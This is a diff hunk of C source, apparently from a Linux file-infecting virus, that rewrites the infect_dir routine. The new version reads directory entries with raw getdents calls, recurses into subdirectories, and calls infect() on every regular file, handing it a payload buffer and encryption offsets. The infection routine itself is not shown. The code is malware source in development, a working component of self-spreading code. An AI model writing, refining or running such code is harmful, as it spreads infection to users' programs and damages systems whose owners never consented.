@@ -157,27 +157,35 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 	//print("infecting directory:");
 	//println(dirname);
 	struct linux_dirent *d;
-	char		*p;
+	char		p[4096];
 	char		tmp[LIM];
-	size_t		size;
+	int		fd;
 
-	if (!getdir(dirname, &p, &size)) return fail("Dir: directory does not exist");
-	size_t x = 0;
-	while (x < size){
-		d = (struct linux_dirent*)(p + x);
-		if (opt.do_recur && !str_equal(d->d_name, ".") && !str_equal(d->d_name, "..") &&  d_isdir(d)){
-			add_base((char *)tmp, dirname, d->d_name, LIM);
-			//print("     d:");println(tmp);
-			//println("dir and can recur!");
-			infect_dir((char*)tmp, b,bn,crypt_off,crypt_len,opt);
+	if ((fd = open(dirname, 65536, 0)) < 0) return fail("open dir");
+	while (1)
+	{
+		int size = getdents(fd, p, sizeof(p));
+		if (size == 0)
+			break;
+		if (size < 0)
+		{
+			close(fd);
+			return fail("read dir");
 		}
-		else if (d_isfile(d)){
-			add_base((char *)tmp, dirname, d->d_name, LIM);
-			//print("     f:");println(tmp);
-			infect(tmp, tmp/*debug_name(tmp)*/, b, bn, crypt_off, crypt_len, opt);
+		size_t x = 0;
+		while (x < size){
+			d = (struct linux_dirent*)(p + x);
+			if (opt.do_recur && !str_equal(d->d_name, ".") && !str_equal(d->d_name, "..") &&  d_isdir(d)){
+				add_base((char *)tmp, dirname, d->d_name, LIM);
+				infect_dir((char*)tmp, b,bn,crypt_off,crypt_len,opt);
+			}
+			else if (d_isfile(d)){
+				add_base((char *)tmp, dirname, d->d_name, LIM);
+				infect(tmp, /*debug_name*/(tmp), b, bn, crypt_off, crypt_len, opt);
+			}
+			x += d->d_reclen;
 		}
-		x += d->d_reclen;
 	}
-	free(p);
+	close(fd);
 }
 
